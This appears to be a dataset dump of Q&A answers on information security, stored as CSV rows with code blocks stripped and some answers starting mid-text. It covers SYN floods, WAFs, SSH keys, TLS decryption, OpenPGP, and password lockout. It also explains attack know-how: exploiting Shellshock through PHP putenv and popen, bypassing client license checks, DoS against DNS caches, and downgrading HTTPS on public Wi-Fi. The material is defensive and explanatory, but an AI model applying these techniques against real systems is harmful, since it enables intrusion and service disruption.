","There is no defined blueprint on what is the best language to learn. Therefor I would like to mention two good alternatives that I (and many otheres) think is a good languages to learn in computer security. Explanation of Lua from : Lua is a lightweight multi-paradigm programming language designed as a scripting language with ""extensible semantics"" as a primary goal. The reason I mention LUA is a good language to learn is that it is the scripting engine for MANY popular security tools. This is a very good reason alone to learn this language. Some of the langauges include: NMAP (Network mapping tool) Snort (Open source IDS) Wireshark (Packet sniffing tool) Vim (Very popular unix text editor) Cisco ASA (firewall, IPS, VPN) Network services tools (Apache, lightHttpd, FreePop) On a side note: Even Blizzard major hit World of Warcraft has support for LUA scripting inside the game :) To whomever that may be relevant to. I am a bit biased on Python after I've started reading the book """". I agree with many of the points from this book why it is good to learn this langauge for a hacker (commonly known as security specialist :)). Quoted from Amazon Python is good language to learn because: it's easy to write quickly, and it has the low-level support and libraries that make hackers happy. It is also very comfortable to be able to interact on the fly with the interpreter in your Python shell.

","Simple DoS-attacks use up the bandwidth. But more sophisticated attacks use up other resources such as CPU time and memory. A SYN flood is targeted at using up memory, (and in some cases CPU-time on hardware firewalls). For an attacker, however, it is easier to flood a victim with SYN-packets, if the victim has a huge bandwidth. How is a TCP connection established? TCP uses a three way hand shake: {code-blk} The traditional way to handle the creation of a connection is this: After the Server received a SYN packet, it has to allocate some memory to store the information about the connection (e. g. client IP, client port, server IP, server port). It acknowledges the SYN packet by sending a SYN ACK back to the source IP-address specified in the initial packet. A SYN flood consists of lots of SYN packet for which the server has to allocate memory. The client can just send and forget about them. Furthermore the source IP-address can be set to anything (unless the ISP of the attacker has filters). Why does the server have to remember the half opened connection? The server needs to verify that the sender of the ACK-packet in step 3 is the one who sent the SYN-packet and received the SYN-ACK packet. This is the way TCP tried to protect against forged IP-addresses and packet injections. (The protection does not work against an attacker who has access to a router through which the packets travel). How to protect against SYN-floods? Instead of allocation memory and store the information about the half opened connection, the server sends the required information back in the TCP-sequence number field in a cryptographic save way. So when the final ACK-packet is received, it can extract the required information, verify it and establish the connection. Wikipedia has a good article on .",41,451,1,True

","IPS like Snort are more of generalists for protecting commonly used Internet Protocols like HTTP, DNS, FTP, SMTP etc. WAFs are supposed to be specialists for protecting HTTP. Just to take injection attacks like SQLi, XSS as a starting point: You can take some or all of mod_security's signatures and attempt to write equivalents for snort. However, IPS products do not have the same level of normalization for [obfuscated attacks][1], thus they are easy to evade. WAFs like Barracuda, normalize web based inputs before they apply their signatures, this prevents bypass using hex/URL/UTF-8/Unicode encoding, SQL comments etc. For , sometime back this mass SQL injection was doing the rounds on the Internet targeting MS SQL: {code-blk} And then apply the SQL checks to block these. IPS, like snort, normally dont provide ""zero-day"" protection against such attacks, they provide specific signatures reactively to such attacks like Asprox botnet specifc signatures etc. And these are not effective against newer zero day vulnerabilities. Then there are new forms of attacks - like HTTP Parameter Pollution which no IPS will defend against, as it involves examining, for example, the concatenated value of multiple input parameters (?a=SEL&a=ECT). This is just a note on injection attacks, there are many other attacks which require a deeper understanding of the HTTP protocol which is absent in most IPS products. Session riding, CSRF, cookie poisoning, cookie replay, etc to name a few. You can also look at  white paper for a high level overview.

","The license generation method isn't really that important, as long as it's non-trivial. The trick is how your client verifies that the license is correct. Let's say you do something like this: {code-blk} to 1 and return, so it never even bothers to ask your server for license validation. So, how do we solve this problem? Unfortunately for you, we can't. You're running into the DRM problem, which essentially states that if you hand someone some data, they can always change it. No matter how much you obfuscate your code, it's possible for the user to eventually reverse engineer it and work out how to make changes, or extract data. If you encrypt content, you eventually have to have the key on the system in order to decrypt it, so there's always a way for the user to extract that key and decrypt the content permanently. The best you can do is make it difficult, which involves a lot of time and effort. Eventually your software will be cracked and end up on a torrent site somewhere. It sucks for developers using this kind of business model, but it's the world we live in. My suggestion is that you go down one of two routes: Create a basic licensing system that works, and accept the fact that some people will pirate it. Serve your real customers by spending your development time actually making improvements to the software, rather than implementing and maintaining draconian DRM systems. Alter your entire development and business paradigm, so that your product is a service rather than a software application.  has been very successful, since it's (practically) impossible to pirate services, and the model allows you to make real-time changes to your codebase, and perform analytics on usage. If you go for option 1, don't involve a server for validation. It adds complexity, provides no added security, brings some privacy concerns, and makes it impossible for your users to use your software if your licensing server is down. Just stick with something simple, e.g. a hash of the username and a secret value on the client side. It's trivial to break, but it gives a minimum barrier to piracy.",329,490,1,True

","Usually, people recommend to use a single private-public key pair everywhere (if we're not talking about a possibility of compromising the private key) Note that there are two key pairs involved in an SSH connection: one to identify the server host (the server has the private key); one to identify the user (the client has the private key), if using public key authentication. The recommendations you cite are about user keys. Having a single private key per user is a viable model, though I don't particularly recommend it (the cost of having separate key pairs per host or site isn't that high). Server keys, on the other hand, are never duplicated. They are generated afresh when the SSH server is installed. On this topic, beyond the posts you've cited in your question, see also In the attack you describe, you've mixed up the roles of the keys. These are the host keys, {code-blk} The attack is thus impossible in this scenario (unless the user goes out of his way to bypass the check — OpenSSH purposefully makes this difficult).

Not only that, but IP addresses also have a definitive geographical region they're assigned to. So you can catch these discrepancies with a bit of digging. Take, for example, said dramatization.

But whether or not the SPF record is actually used to determine the spoofiness of an email is completely up to the receiving email service. So there you have it. SPF in a nutshell. So yeah.

Tracking file writes for that keylogger can point you to it's cache and maybe the key file will indicate if the keylogger is targeting Runescape or the user. I recommend  for tracking file writes. A different way of finding the destination email address is debugging the keylogger. You could start with a memory dump and a search for strings. First you identify the keylogger process by tracking the writes that happen after key presses, then use  to search the strings from the memory dump of the process. and a bit of patience can be useful for debugging the code of the keylogger by setting breakpoints on SMTP functions and then inspecting the memory for email addresses.",65,356,1,True

There was a discussion back in the day, when shallot first surfaced, about whether custom names for hidden services are bad or not. Problem number one: generated keys have a much larger public exponent than the standard keys produced by TOR, which puts a somewhat higher load on the TOR relays. Answer: it was concluded that the difference is negligible compared to the other encryption tasks the relays perform constantly. In eschalot, the largest public exponent is limited to 4294967295 (4 bytes). Problem number two: TOR developers can decide to filter and block all the custom names. Answer: yes, they can, but they have not yet and there is really no reason for them to do so.

","When used in tunnel mode IPsec treats the IP packet as a payload. Therefore, all this information is encrypted. In order to be routed correctly, the IPSec-enabled entity then build a new packet. This IP packet is built to be send to the tunnel end, e.g. another IPSec gateway. So as to achieve this, the new IP packet will have a brand new IP-Header, with destination IP set to this particular equipment address. The rest of the packet will contain the traditional ESP data composed of a header, payload (the original packet) trailer and authentication data. Here is a schematic of the packet and it's encapsulation into a tunnel-mode IPSec packet: {code-blk} The main interest of the tunnel mode is to protect the (internal) addresses of a network. You can take as an example a company with two offices separated by X kilometres. Two IPSec gateway are setup and all traffic from one network to the other is encapsulated in the IPSec tunnel. The only thing visible by an outsider is that the two gateway communicate with each other using IPSec protocol. What's insides could be any type of communication. The IPSec packet will still follow the rules of internet routing.",239,296,1,True

","Yes, it is a threat. Not just with open networks, any network owned by someone you don't trust (like mall networks which are secured but provide a password) There are many things they can do: Read all your unencrypted traffic Anything you send over an http connection can be read by them. Passwords, usernames, credit card numbers, the works. All of these are sent in plaintext and can be easily logged. Many apps run on unencrypted connections as well. There's a lot of important information that can be snooped from those. Phish all your encrypted traffic Usually it's hard to spoof HTTPS because you need a valid certificate for that to work. However, many times you type in an HTTP URL in the address bar and it redirects you to the HTTPS equivalent. For example, when you type {code-blk} in the URL but really points to a completely different server. Both mobile and desktop browsers seem to allow 301 redirects without a fuss.Desktop browsers make a fuss when there's an unauthorized HTTPS redirect, but mobile browsers don't. On modern desktop browsers, it is easy to identify when this is happening, for example, Chrome shows this: when on an https connection. If you are alert, you'll notice if the HTTPS is replaced with HTTP on a desktop browser(since the icon is no longer green), but most mobile browsers don't seem to have any way of indicating a secure connection. This problem can be solved (on the site side) by using HSTS, and on your side by using bookmarks and keeping browser history. Unauthorized access to device Depending on your sharing settings (and what you set the network as -- always, always use ""Public"" for networks you don't trust), it may be possible to access your Windows filesystem.

LFSR is used in: DVD encryption (also known as CSS)  2 LFSR GSM encryption (A5/1.2)  3 LSFR Bluetooth (E0): 4 LFSR The hardware for the above is widely deployed and therefore hard to update, or bring up to modern standards.  All of the above are badly broken and should not be trusted for secure communications. Attack: Since the key is broken into two sections during encryption (17 bits, and 25bits) and those bits are used to encrypt the same cipher text, it's possible to use knowledge of the MPEG format, and bruteforce a 17bit key to extrapolate what the 25bit key is. This is hardly new, but FOSS is easy to find that demonstrates this issue. Solution: The  (in 2008) qualified 5 stream ciphers that should be used.  A notable difference is that instead of using a Key with an IV, the ciphers use a Key, a nonce, and a counter.  Salsa20 operates this way and is designed to be used in both hardware and software easily. Specifically, it's included in the x86 SSE2 instruction set.

","The username is not commonly exposed to websites. Perhaps it can be done with Java in some way, but not by the browser by default. Note that I mean Oracle's Java, not Javascript! Some websites use Active Directory authentication. If you visit one with Internet Explorer that runs in the same Windows domain as your computer is in, you'll automatically be logged in.

Your password is not transmitted; the browser only answers a challenge from the server and proves its identity that way.

","""Role based authentication"" isn't an industry term. Perhaps you confused it with , which is a method of controlling access to functions based on a users ""role"", rather than his identity. For example, a blog system might define an ""Author"" role and an ""Editor"" role. An ""Author"" might have permission to create new stories, but not to publish them. An Editor would have permission to review and modify, and publish existing stories. Any given user might ""belong"" to one or more roles on a permanent basis, or might be temporarily granted role authorization during a given session. But critically, permissions and capabilities are never assigned directly to users, but instead always assigned to roles. Users gain that permission indirectly by taking on a given role. Likewise, a person's credentials are associated with the user account and not the role.

It is easy to see if we consider it in two steps: In the presence of Diffie-Hellman, a  requires the attacker to put his own DH public key in lieu of that from Alice or Bob (a MitM is a double-impersonation, so the attacker must do the substitution twice). It suffices for Bob to ""make sure"" that what he received is indeed what Alice sent to detect such a substitution. Bob can phone Alice and spell out, over the phone line, the DH public key he received (which includes the DH group parameters p and g, and the actual DH public key from Alice ga mod p). Instead of spelling out the three big integers (that would be more than 1500 hexadecimal characters), Alice and Bob can simply use the hash of the values. As long as the hash function is second-preimage resistant, verifying the hash value is as good as verifying the complete public key. This method is exactly what happens with . The first time you connect to an hitherto unknown SSH server, you get something like this: {code-blk} At this point, you are supposed to phone the sysadmin of the intended server to check the hash value (or check it against some any other authoritative source, which depends on the context). This is exactly what you suggest. The SSH client then records the public key from the server, so that no such question is needed for subsequent connections.",89,383,1,True

","Here's the answer to the technical part of the question. As for the legal bit, well... here's the technical bit: All three services are encrypted, but there's some concern about the scope of that encryption: Client-only encryption: {code-blk} If your worry is eavesdropping by between you and your provider, then client-only encryption is fine. If you want to make sure that there is no evesdropping or modification anywhere along the path between between me and you, then only end-to-end encryption is sufficient. Voice and data are often encrypted end-to-end simply as a matter of performance: it's a lot of data to move around, so the traffic goes directly between the two callers (""Peer to Peer""), which means it's also encrypted from one caller to the other. Text data (chats) are typically routed through the provider's servers. This allows them to store chat history and deliver messages to offline users when they come back online. These are typically not encrypted end-to-end. As for as who does what, all three systems are proprietary, so you don't know. We know with certainty that Skype's text messages are not encrypted end-to-end because , we know Google+ text messages are not end-to-end encrypted because your chat history shows up in your Gmail box. And it appears that Apple has access to your facetime text messages as well. As for the security of voice and video; as mentioned before, peer-to-peer communication is typical, which would prevent snooping. But it is at least possible for all these providers to route traffic through their own servers as intermediaries, perhaps on a call-by-call basis. But perhaps most importantly: All three of these services are more secure than a telephone. The security of telephone calls is approximately zero. Most phones make no attempt at encryption; listening to the phone call is as simple as attaching a speaker to the wire.",129,435,1,True

If you want to send a XML-RPC request with an xml body in an html form you must use a form like this: {code-blk} (But if the web application or server checks the content-type it will not work.) and for same-origin policy : CSRF in Plupload (CVE-2012-3415) The Plupload applet called Security.allowDomain('*') to allow the applet to be used from any domain (so it could be served from S3, for instance). That meant people could interact with the Plupload applet from any other site on the Internet by embedding it on a page and using JavaScript. But due to the way the same-origin policy works in Flash, the applet could still make requests back to the domain on which it was hosted. In addition, people can specify the full URL for an upload request via JavaScript and the result of that request (ie: the HTML of the resulting page) is passed back via JavaScript to the embedding page. So, if an attacker could convince a target to interact with the applet (by selecting a single file to be uploaded), the attacker could make a request to the domain that the applet was hosted on and read back the full response. That could disclose CSRF tokens or other sensitive information. This issue was especially important for Wordpress installations, where Plupload applets are hosted inside of the wp-includes directory by default. The issue was resolved by removing the call to Security.allowDomain('*') by default. Additionally, Flash applets can have XSS vulnerabilities as well.",93,413,2,True

For cipher suites using the RSA key exchange, the private RSA key can be used to decrypt the encrypted pre-master secret. For ephemeral Diffie-Hellman (DHE) cipher suites, the RSA private key is only used for signing the DH parameters (and not for encryption). These parameters are used in a DH key exchange, resulting in a shared secret (effectively the pre-master secret which is of course not visible on the wire). Wireshark supports various methods to decrypt SSL: By decrypting the pre-master secret using a private RSA key. Works for RSA key exchanges and subject to the above limitation.

","The easiest way to do what you're asking is simply to use  to connect to the site with a restricted cipher list.  And, in fact, the same approach will work for a number of tools - certainly with most programming or scripting languages (Python (as @terry-chia suggests), Perl, tcl, C...) and with browsers (some ). Let's walk through how you can do this with openssl. Determine ciphers you want to try You can use the tool  to determine ciphers that a given site accepts or rejects: {code-blk} Note the following signs: We do not see the ""handshake failed"" error message Instead of ""New, (NONE), Cipher is (NONE)"", we see ""New, TLSv1/SSLv3, Cipher is ECDHE-RSA-AES256-SHA"" We also see the same Cipher listed under the SSL-Session section. You can see where I typed in an HTTP command ""TRACE / HTTP/1.0"", and where Google responded ""HTTP/1.0 405 Method Not Allowed"".  You would not be able to do this or see this if the cipher had been rejected, obviously; you can only talk to the HTTP server if the SSL connection was nailed up successfully. Caveats This is relatively easy in openssl command line.  Doing it in code may be harder, depending on the language and the library used.  Doing it in browsers may be painful, because such fine-grained control is not readily accessible - for example, if Chrome is using the OS for SSL on Windows, you need to figure out the registry keys used to manipulate SSL. Another problem can be figuring out which cipher string you want to test.  If you're investigating the report of another tool, as your question suggests, it's probably not describing the cipher problem it sees in terms of an OpenSSL cipher string.

","The common example of a P2P protocol is Bittorrent. In this protocol the communications are often managed by a tracker. This means for data transfer, a minimum of three nodes are needed: {code-blk} has not announced since you connected, he doesn't know you exist yet. However if you have set up port forwarding correctly, when he does announce and get the new state table with you in it, he could initiate the connection with you. This will work since your port is forwarded. If both of you did not have port forwarding enabled, then despite the fact you were both announcing to the tracker, because the ports you told the tracker about don't actually reach back to your machine, all possible data connections are blocked by your routers/NAT devices. So in brief: port forwarding helps with the health of P2P data exchange by making it easier for connections to be established - and unless every member enables port forwarding of some kind, it is impossible to exchange data in a P2P manner.",121,235,1,True

","For this module in Metasploit (exploit/unix/webapp/joomla_tinybrowser), you'll need to target the endpoint from which the Joomla site is accessible, in this case the Apache server.

VHOST essentially populates the Host HTTP header which will probably allow the attack to reach the ""Joomla server"".

Blind SQL injection can occur on any data type, not just strings. Of course it can be string-based, but no more so that normal SQL injection can.

","I'll use BIND as the example server software here, for the obvious reason. 1) You can't fill up the disk of dns caching servers.  Cache is in memory, not on disk.  The only way the cache goes to disk is if the administrator goes in and triggers a dump to disk by hand (and that dumped version isn't used by the cache server, it's just there for the administrator to debug with). 2) You can DOS - or at least impact the performance of - caching DNS servers by filling up the cache.  Consider  - granted, it's 10 years old, but BIND has always been remarkably predictive of BIND. 3) I'm not even sure AXFR gets cached, or that cacheing nameservers will handle AXFR queries.  For example, you can query this example domain directly: {code-blk} That being said, I couldn't find a good reference that would explain what BIND's caching server will or will not do, so it's hard to make a sweeping statement. 4) Bottom line: Sure, you could DOS a DNS server, but I'm not sure your ""large AXFR"" method is likely to do it.  And any such DOS would be temporary (in memory), not systemic.  A more likely method would be to create a ginormous number of A records with large TTLs and query them all individually.

With that in mind, take your original authorization requirement A user can only read data of projects he is assigned to.

See, for example, . It also meets your other two requirements - reversibility and performance. If you don't need the PRP notion of security, then use a block cipher. You might even be able to use a Format Preserving Encryption (FPE) scheme. See, for example,  and even  for some ideas.

Naively, I'd say perform the selection on the encrypted data, decrypt the data, encrypt the data under the remote system's public key, and then send the encrypted data to the remote system. However I think that an attacker could use the encryption process as an oracle and recover the data due to its low entropy. Its going to leak information if it lacks the PRP notion of security; not because of low-entropy data like SSNs. For example, RSA/OAEP can effectively mask a SSN. The bad guy has no more advantage than guessing (with some hand waiving). You will also need a strategy for storing the private key. Perhaps an HSM or KMIP.

","To add to what has already been said, I can think of 2 more reasons why changing passwords regularly is helpful: 1) When computational power raises substantially Say, in early 90s 7-char passwords were considered secure because computers weren't nearly powerful enough to bruteforce them. 24 years later systems which still have the same password can be successfully bruteforced.

","You can't, unless you have administrative control over the 3rd party web server, or retrieve the certificate via some other nefarious means. SSL/TLS is reliant upon the private certificate staying private. Furthermore, even if you had the server's private key, you might not be able to decrypt traffic from an earlier session if  was used. In that case you would have to know the specific private key used for your single session. In principle, because you are the client, you are privy to the pre_master_secret which is what you need to derive the master_secret. The master_secret is the symmetric key that's actually used to encrypt your session. As @pqnet said, , although it is dependant upon the client software, and I'm not sure about Flash. However, there are more trivial methods to inspect your own HTTPS traffic... Local Proxies Since it is your own connection, there is no reason why you can't pass the website through a proxy server. Many proxy servers are configured to allow SSL-pass-through, which still gives you end-to-end encryption, but you can break this by terminating your connection at the proxy server (if you trust the proxy's SSL certificate). The proxy will then establish it's own SSL connection to the 3rd party website, passing along any traffic you send. Companies sometimes use the same method to inspect their users' outgoing HTTPS traffic (that's a contentious one). Essentially it's a man-in-the-middle. {code-blk} Local proxies run on your own machine, and allow you to inspect and even modify traffic that passes through them.

","There's an even easier way to bypass the ""execute"" permission: copy the program into a directory you own and set the ""execute"" bit. The ""execute"" permission isn't a security measure.  Security is provided at a lower level, with the operating system restricting specific actions.  This is done because, on many Unix-like systems (especially in the days of Ritchie and Thompson), it's assumed that the user is able to create their own programs.  In such a situation, using the ""execute"" permission as a security measure is pointless, as the user can simply create their own copy of a sensitive program. As a concrete example, running {code-blk} trying to get a ""write"" file descriptor for the hard drive and failing, because the user I'm running it as doesn't have permission to do that. The purpose of the ""execute"" permission is two-fold: 1) to tell the operating system which files are programs, and 2) to tell the user which programs they can run.  Both of these are advisory rather than mandatory: you can create a perfectly functional operating system without the permission, but it improves the user experience. As R.. points out, there's one particular case where the ""execute"" permission is used for security: when a program also has the ""setuid"" bit set.  In this case, the ""execute"" permission can be used to restrict who is permitted to run the program.

Use long key IDs or the full fingerprint instead. Asymmetric Encryption Algorithms There are mainly three choices for choosing algorithms: DSA/Elgamal, RSA and elliptic curves (ECDSA). DSA is very dependent from good random numbers during key generation and usage of the key. As there have been several issues with random number generators, it isn recommended as default algorithm any more (, , more on ), although smaller keys are sufficient (compared with RSA). RSA needs larger key sizes, but is considered secure for adequately large keys. , . Keys starting from 2048 bits are considered safe , keys of 4096 bits . Ellipctic Curves aren't broadly supported yet (GnuPG 2.1 will bring them, Google's End to End already uses them), and the  (without any proof). Generally, elliptic curves are considered safe. I posted more on choosing keys in a . Further Settings for Hashing and Symmetric Encryption OpenPGP's and GnuPG's defaults do not meet highest possible security for compatibility reasons.

","From my testing it does seem possible to exploit via PHP using mod_php if certain conditions are present. /bin/sh would by symlinked to /bin/bash. The PHP app would set an Environment variable from a user-controlled HTTP variable using putenv(). Somewhere in the PHP script, there is a subsequent call to a command exec function that will then load that env variable (exec(), passthru(), system(), popen(), etc) since its running in a bash shell instance. This system call/command exec function does not need to be related at all to the setting of the environment variable, as long as it happens afterwards. For example, here is generalized form of some code I saw earlier today that sets a LANGUAGE environment variable based on an unsanitized GET parameter. The popen call I added to the bottom would be the trigger. {code-blk}so tampering with that header value could also trigger the vuln. Obviously it's really bad practice to set any variable based on untrusted user data. In this case, its the call to popen (which runs in Bash thanks to the symlink) that will ultimately execute the payload. I tested this in a Debian environment after setting the symlink and the payload executed successfully. In line with what hspaans said, you're not able to influence the setting of arbitrary environment variables with calls to system() or exec(), so the success of exploiting something like this is completely dependent upon the design of the application and the environment in which it runs.

Several cryptanalytic approach exist that can be adapted to your case. A simple distribution test will reveal that it's worthwhile to run an attack.

","ISAKMP isn't a protocol as much as a framework for key exchanges (I know it has protocol in the name).  Implementations of the framework include the  and . If you read the ISAKMP RFC (RFC2408) it has a nice diagram for where ISAKMP sits in the network stack. RFC2408 Section 2.2 ISAKMP Placement {code-blk} This is a little bit ambiguous because it wants to protect the IP layer, but it must also perform negotiations between two IPs prior to encapsulation.  However, in  it states the following: ISAKMP can be implemented over any transport protocol or over IP itself.  Implementations MUST include send and receive capability for ISAKMP using the User Datagram Protocol (UDP) on port 500.  UDP Port 500 has been assigned to ISAKMP by the Internet Assigned Numbers Authority (IANA). Implementations MAY additionally support ISAKMP over other transport protocols or over IP itself. ISAKMP can be implemented at either Layer 3 (IP) or Layer 4 (Transport).  Implementations must have support for transport layers, and optionally support an IP implementation. IKE is one of the most common protocols used to negotiate IPSec keys.  However both KINK () and IKE use UDP packets to perform their exchange of keys between two peers. While ISAKMP can occur at either IP or Transport it's most commonly implemented over Transport which would place it at Layer 5 (Session), but it could sit at Layer 4 (Transport) if it's implemented over Layer 2.",355,358,7,True

   considered valid revocation signatures.
","Certification Capability defines the certification flag as mandatory: In a V4 key, the primary key MUST be a key capable of certification. The subkeys may be keys of any other type. It hints that operations manipulating subkeys are to be considered certifications: It is also possible to have a signature-only subkey.  This permits a     primary key that collects certifications (key signatures), but is used only for certifying subkeys that are used for encryption and signatures. Signature Types Which (signing) operations are now to be considered certifications and depend on this capability? ""Signing other keys"" obviously means issuing certifications, being already contained in the naming. As defined in : {code-blk} I cannot find any explicit restriction that disallows subkeys to act as revocation keys. [RFC 4880, Revocation Key)(https://www.rfc-editor.org/rfc/rfc4880#section-5.2.3.15) does not limit the target to primary keys, but also not explicitly allows subkeys. This might the only one not requiring certification capabilities. Yet GnuPG only creates revocation key signatures for primary keys. Another hint only primary keys should be allowed is that subkeys are always named as such if they apply in that section, so I'd assume only primary keys should be allowed. Meaning of Certification Privilege If I remove the primary key (with its Certify capability) from a keyring I can see that I am no longer able to generate a revocation certificate: Secret parts of primary key are not available. Is that because I no longer have the Certify capability, or because I no longer have the primary key (does the primary key itself have special powers for revocation?) In the end, there is no difference between a primary key and a key with certification capability, only primary keys may have it, but those also must.",209,438,1,True

","Hybrid Encryption Systems OpenPGP defines a hybrid encryption system, which combines the best of both asymmetric (public key) encryption and symmetric encryption. While asymmetric encryption is great at key management, it is very slow for encrypting large amounts of data; symmetric encryption on the other hand would require exchanging keys with everybody you want to communicate with individually, but has great performance. Hybrid encryption systems use asymmetric encryption to encrypt a random key for symmetric encryption, while the actual message is symmetrically encrypted. In OpenPGP, this key is called the session key. Multiple Recipients This has another advantage: If multiple recipients should be addressed, there is no need encrypt the message multiple times. Instead, all that needs to be done is encrypting the session key for everybody. You can observe this by looking at the packets contained in a file after encrypting to multiple persons (here, {code-blk} The Public-Key Encrypted Session Key Packet is contained twize, once for each encryption (sub)key.

",You should look at oauth 2.0 (RFC 6749) it has a number of flows which could meet your requirements. Firstly you need to know if the clients are public or confidential. Issuing client api keys as you are doing is pointless if the clients are web browsers or apps downloaded to mobile devices as the secret can't be maintained. If they are servers then api keys are good. So that is your first consideration. Section 2.1 of the rfc deals with client types and that will determine which flows are applicable. You need to separate identification of the client service from the user the client is acting for. Your backend database should have association of users with tenants and possibly api keys with users or user+tenant if you want to scope to just a single tenancy. I've implemented services where users can participate in multiple tenants so that may or may not apply to your case. I have successfully used the resource owner password credentials grant request so that a user can provide their username and password from a web browser. It sounds like you have used an out of band method to authorize the client so user credentials are not required. But if the client is a web browser or mobile app you can't rely on client auth and must get authorization from the user and that means providing user credentials. Regardless of the flow you use you end up with a response as follows: {code-blk} If your clients are using TLS then bearer tokens are the simple way forward. See section 7.1 of the RFC for more details. Finally since access tokens are only temporary your clients can use the refresh token to request a new access token once the access token nears or exceeds its expiry.  Its up to you if you want to use refresh tokens or not. Clients will need to store them securely at least the same level of protection they use for their api keys. In your system refresh tokens may be unnecessary for server-server interactions if the access lifetime is sufficient and user authentication is not required. If user authentication is required then refresh tokens may be useful if the client storage provides a sufficient level of protection.,138,470,1,True

","TL;DR It protects against having to manually configure services to only listen on localhost, as you have to manually allow them network connectivity, and it increases the effort an attacker must exert to recon your box. This means it's an effective tool both against attackers and poor configuration.  Yes, you should run a firewall. Detail Ports have 2 main states: Open (Service is listening) Closed (There is nothing listening) You appear to be familiar with the two states - ports default to ""closed"", switching to ""open"" if there is a service listening.  It's very fast to enumerate both open and closed ports - the OS will actually send a response saying either ""there is a service here"" (port is open), or one saying ""there is no service here"" (port is closed). If you use a firewall, it provides the option to filter ports.  For filtered ports, the OS does not respond at all.  This means an attacker must invest more time to determine port states, as they have no way to know if the computer didn't send any response, or if the response was lost in transit. Additionally, if you're running a firewall, you protect yourself against accidentally exposing additional services to the Internet.

","In the end, the following hypothesis from my question above proved to be true: I can see how a bug in OpenSSL could allow an attacker to bypass authentication, for example if OpenSSL would accept DH parameters in the Client Key Exchange message, i.e. if OpenSSL did not properly enforce this part of RFC 5246, section 7.4.7 This code comes from the {code-blk} Thus an attacker could provide a certificate and perform the DH key exchange using another public key than the one in the certificate! For some reason, the OpenSSL developers choose not to require an empty Client Key Exchange message when the client provides a DH cert. (Even though this is required by the RFC.) The reason why the fix from the OpenSSL team does not break client authentication with DH certs is the ssl3_get_cert_verify() function is not called if ssl3_get_client_key_exchange() read the key from the certificate.

","Android essentials does when installing applications.  Each app gets a group assigned to it, and only that group can access the data for the app.  In a Unix based system this is rather simple to implement.  Windows gets a bit harder. Access Control Lists What you can do is  for your application.  These can be converted into Security Descriptors which can be used with functions like CreateDirectory.  The DACL will contain all the information about who can access the folder.  In this case you'll probably want to create a Windows group for the application. When you create your directory you can restrict access to the DACL you create.  When your application runs/needs to access the directory it acquires the DACL, and uses it in subsequent system calls.  These aren't the easiest Windows object in the world to work with, but they do what you want. Creating Users You can create a User Profile in Vista+.  More than a little tricky because Windows wasn't designed for this.  Impersonating a logged on user requires some type of access token for the user you're attempting to use.

Now we're left with a bunch of functions that require an existing token to duplicate and start from.  That means you're left with the current user's token which is not what you want. Creating tokens is pretty much out of the question.  That operation is often only done by LSASS, and I wouldn't be surprised if this whole behavior was flagged by Anti-viruses.

","Google Authenticator is a offline authenticator. It can both be time-based or event based. Time-based means it will use a Clock to detect the correct code to display. To prevent desynchronization because the Clocks are imprecise, you simply have a correction factor, so you configure the server to accept a previous code, current code, or a later code. If a previous code is used, you store ""-1"" in database. If a later code is used, you store ""+1"" in a database. And then you decrease or increse the number according to syncronization. ""-1"" would then mean you accept the code corresponding to time -2, time -1 and time. ""+2"" would then mean you accept the code corresponding to time +1, time +2, and time +3 A important thing is to store the time of the last accepted code, so codes that are equal or previous to the used code cannot be reused. Since the authenticator is completely time-based, it will mean the same key can be used for unlimited number of servers. Please note that if servers are offline or cannot talk with each other, then a spent code from a machine can be reused at Another machine, provided it hasnt expired in time. You can also use a Event-based setting, with a counter that Counts up for each display of the code, and then you simply accept all codes that are up to lets say 50 events in future, and then store the Count of the last used code so codes cannot be reused, but then you need one unique key for each machine. The KeyURI format is to initalize the Google Authenticator, normally you embed the KeyURI in a QR code displayed on screen on account setup, and then you scan it with Google Authenticator to add the seed to Google Authenticator. You simply type a friendly name as ""label"", for example: ""Server at 192.168.10.3"" And then when you look in Google authenticator, you might see: {code-blk} and so on.

","Do bitcoin miners(or some of them) accept customizable inputs and hash them in bulk(instead of accepting some more high-level instruction and do mining works automatically)? Bitcoin miners generally take a parameter called ""target"" and ""header"" and return a nonce+overflow.  I don't think it's possible to hash X times, resulting in predictable output (e.g. you want to compare hashes).  The Bitcoin game is one of ""finding a lower number"" and ""hash as fast as you can until you do"". Yes, Bitcoin is literally comparing the SHA2 output of two values as a BigInteger and should only return when this is found.  (maybe what you need is possible, but I would think this feature would introduce inefficiencies for the Bitcoin game and would be undesirable) Here is what goes on inside bitcoin miners: Note: step 3 and 4 is Bitcoin Hardware, the rest is your custom driver software Step 1 At a high level, the miner software takes a list of active transactions, and then groups them together in something called a ""block"". Or more accurately stated: The miner software coverts all the transactions into a summary view called a  ""merkle root"", and hashes it, which is representative of the transactions. Step 2 Then mining software converts this to into a binary format called a , which also references the previous blocks (also called a chain). {code-blk} Summary So at the end of the day, all a miner does is: Take a block header as input Change the Nonce Test if the Block Header hash is less than the Target.  If it is, you win. Go to step 2  (or go to step 1 if someone else won the block)",137,395,2,True

","Yes, the account should be locked out. The reason is that the successful login could be from the real user, and the failed logins could be from an attacker. The fact that the real user has logged in should not reset the counter for the attacker. Of course you could track sessions and only lock out the user if they are on a different session than the real user, however here there is more risk of implementation bugs meaning you could inadvertently introduce something that allows an attacker to work around the lockout. With security it is often best to keep things as simple as possible. You should also rate limit repeated attempts from the same IP address as that will help protect against a horizontal attack against different user accounts. The above is comment on your current proposal, however I would also go for an increasingly delayed response rather than locking out. e.g. {code-blk} That way the real user will be able to log in during a brute force on their account and the attacker cannot cause a Denial of Service on the legitimate user. For longer delays you could display something to the user to show that their login is in progress so they would not be tempted to click again. Of course you do not want the maximum delay to be much longer than several seconds, however adding an artificial delay across threads will delay an attacker. The difference between slowing down login and showing an account locked out message is that the real user will not have to keep submitting their login details - they just need to be patient while login is progressed.",22,328,1,True

","Answer 1: if the server uses SSL/HTTPS(verified  by third party-not self-signed certificate), cookies and session IDs travel as cipher-text over the network, and if an attacker (Man in the Middle) uses a packet sniffer, they can not obtain any information. They can not decrypt data because the connection between client and server is secured by a verified third party.so HTTPS without verified certificate means server and user can not make sure that session ID is not sniffed. it means that every data (i.e cookies) must be send and receive after establishing a secured HTTPS between user and server and can make sure that the session ID is securely sent to the user. also asymmetric cipher just use for exchanging key of symmetric cipher(that is used for ciphering data between client and server). for better image right click: open image in new window Answer 2: Cookies are handled entirely by the request header in HTTP header fields, cookies in the client side are encoded in the 'Cookie' and 'Set-Cookie' response header and in the server side are encoded in the 'Cookie' request header - $Path variable.

